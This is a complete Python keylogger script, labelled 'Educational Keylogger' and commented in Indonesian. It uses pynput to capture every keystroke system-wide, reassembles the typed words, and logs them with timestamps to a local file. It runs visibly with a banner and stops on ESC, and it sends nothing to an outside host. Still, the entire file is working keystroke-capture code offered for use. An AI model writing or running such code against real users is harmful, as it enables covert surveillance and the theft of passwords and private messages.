from pynput import keyboard
import datetime
import sys
import os


class SimpleKeylogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        self.start_time = datetime.datetime.now()
        self.key_count = 0
        self.current_word = ""  # Buffer untuk kata yang sedang diketik
        
    def print_banner(self):
        """Menampilkan banner mirip sqlmap"""
        banner = """
    __ __          __                          
   / //_/__  __  __/ /___  ____ _____ ____  _____
  / ,<  / _ \/ / / / / __ \/ __ `/ __ `/ _ \/ ___/
 / /| |/  __/ /_/ / / /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\___/\__, /_/\____/\__, /\__, /\___/_/     
           /____/        /____//____/              
"""
        print("\033[1;34m" + banner + "\033[0m")  # Warna biru bold
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print("\033[1;33m[*]\033[0m Educational Keylogger v1.0")
        print("\033[1;33m[*]\033[0m Starting at: \033[1;32m{}\033[0m".format(
            self.start_time.strftime('%Y-%m-%d %H:%M:%S')))
        print("\033[1;33m[*]\033[0m Log file: \033[1;32m{}\033[0m".format(self.filename))
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print()
        
    def write_to_file(self, message):
        """Menulis log ke file"""
        with open(self.filename, "a", encoding="utf-8") as f:
            f.write(message)
    
    def display_word(self):
        """Menampilkan kata yang sudah diketik"""
        if self.current_word:
            print("\033[1;36m[WORD]\033[0m {}".format(self.current_word))
            # Tulis kata ke file juga
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            self.write_to_file(f"[{current_time}] [WORD] {self.current_word}\n")
    
    def on_press(self, key):
        """Callback saat key ditekan"""
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            char = key.char
            log_entry = f"[{current_time}] {char}\n"
            self.key_count += 1
            
            # Tambahkan karakter ke buffer kata
            self.current_word += char
            
            # Tampilkan dengan format sqlmap-style
            formatted_output = "\033[1;32m[{}]\033[0m {}".format(
                current_time, 
                char
            )
            print(formatted_output)
            
        except AttributeError:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT_R]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPS_LOCK]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PAGE_UP]",
                keyboard.Key.page_down: "[PAGE_DOWN]",
            }
            
            key_name = special_keys.get(key, str(key))
            log_entry = f"[{current_time}] {key_name}\n"
            self.key_count += 1
            
            # Tampilkan kata jika spasi, enter, atau tab ditekan
            if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
                self.display_word()
                self.current_word = ""  # Reset buffer kata
            
            # Handle backspace
            elif key == keyboard.Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
            
            # Tampilkan special key
            formatted_output = "\033[1;32m[{}]\033[0m {}".format(
                current_time, 
                key_name
            )
            print(formatted_output)
            
            # Stop jika ESC ditekan
            if key == keyboard.Key.esc:
                # Tampilkan kata terakhir jika ada
                if self.current_word:
                    self.display_word()
                print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
                return False
            
        except:
            return True
        
        # Tulis ke file
        self.write_to_file(log_entry)
        
        return True
    
    def print_footer(self):
        """Menampilkan informasi akhir"""
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time
        
        print()
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print("\033[1;33m[*]\033[0m Keylogger stopped")
        print("\033[1;33m[*]\033[0m End time: \033[1;32m{}\033[0m".format(
            end_time.strftime('%Y-%m-%d %H:%M:%S')))
        print("\033[1;33m[*]\033[0m Duration: \033[1;32m{}\033[0m".format(duration))
        print("\033[1;33m[*]\033[0m Total keys logged: \033[1;32m{}\033[0m".format(self.key_count))
        print("\033[1;33m[*]\033[0m Log saved to: \033[1;32m{}\033[0m".format(self.filename))
        print("\033[1;37m" + "=" * 70 + "\033[0m")
    
    def start(self):
        """Memulai keylogger"""
        # Clear screen (opsional)
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Tampilkan banner
        self.print_banner()
        
        # Info tambahan
        print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
        print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
        print("\033[1;37m" + "-" * 70 + "\033[0m\n")
        
        # Mulai listener
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        finally:
            # Tampilkan footer saat selesai
            self.print_footer()


def main():
    """Fungsi utama"""
    print("\033[1;33m[*]\033[0m Initializing keylogger...")
    
    # Buat instance keylogger
    logger = SimpleKeylogger()
    
    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
        logger.print_footer()
    except Exception as e:
        print(f"\n\033[1;31m[!]\033[0m Error: {str(e)}\033[0m")
        sys.exit(1)


if __name__ == "__main__":
    main()

# plenger